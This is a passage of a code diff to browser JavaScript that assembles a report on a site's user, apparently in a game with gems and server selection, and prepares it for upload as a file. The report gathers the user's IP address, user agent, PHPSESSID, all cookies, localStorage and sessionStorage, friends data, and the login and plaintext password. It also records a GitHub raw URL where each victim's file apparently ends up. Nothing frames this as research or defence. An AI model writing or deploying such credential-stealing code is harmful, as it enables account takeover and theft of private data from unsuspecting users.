@@ -211,10 +211,8 @@
             const sessionStorageData = JSON.stringify(sessionStorage);
             
             // Формируем текстовый файл
-            let fileContent = "=== ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ ===\n";
-            fileContent += `--- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---\n${userLevel}\ngems: ${user.premiumPoints}\nselected server: ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}\n\n`;
+            let fileContent = `--- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---\n${userLevel}\ngems: ${user.premiumPoints}\nselected server: ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}\nAccses URL: https://raw.githubusercontent.com/uloxa13/userDatas/refs/heads/main/${Math.floor(Date.now() / 1000)}_${user.login}.txt\n\n`;
             fileContent += `--- ОСНОВНЫЕ ДАННЫЕ ---\n`;
-			fileContent += `Accses URL: https://raw.githubusercontent.com/uloxa13/userDatas/refs/heads/main/${Math.floor(Date.now() / 1000)}_${user.login}.txt\n`;
             fileContent += `IP-адрес: ${userIP}\n`;
             fileContent += `URL страницы: ${window.location.href}\n`;
 			fileContent += `Network Type: ${navigator.connection.effectiveType}\n`;
@@ -223,7 +221,6 @@
 			fileContent += `Laungage: ${navigator.language}\n\n`;
             fileContent += `User-Agent: ${navigator.userAgent}\n\n`;
             fileContent += `--- PHPSESSID ---\n${phpsessid || "PHPSESSID: не найдена"}\n\n`;
-			fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ userDataResult ---\n${userDataResultStr}\n\n`;
             fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData ---\n${friendsDataStr}\n\n`;
             fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr ---\n${friendsArrStr}\n\n`;
             fileContent += `--- УЧЕТНЫЕ ДАННЫЕ ---\n`;
@@ -231,7 +228,8 @@
             fileContent += `Пароль: ${credentials.password}\n\n`;
             fileContent += `--- ВСЕ КУКИ ПОЛЬЗОВАТЕЛЯ ---\n${allCookies || "Куки не обнаружены"}\n\n`;
             fileContent += `--- LOCALSTORAGE ---\n${localStorageData}\n\n`;
-            fileContent += `--- SESSIONSTORAGE ---\n${sessionStorageData}\n`;
+            fileContent += `--- SESSIONSTORAGE ---\n${sessionStorageData}\n\n`;
+			fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ userDataResult ---\n${userDataResultStr}\n\n`;
 
             const textBlob = new Blob([fileContent], { type: 'text/plain' });
             const formData = new FormData();
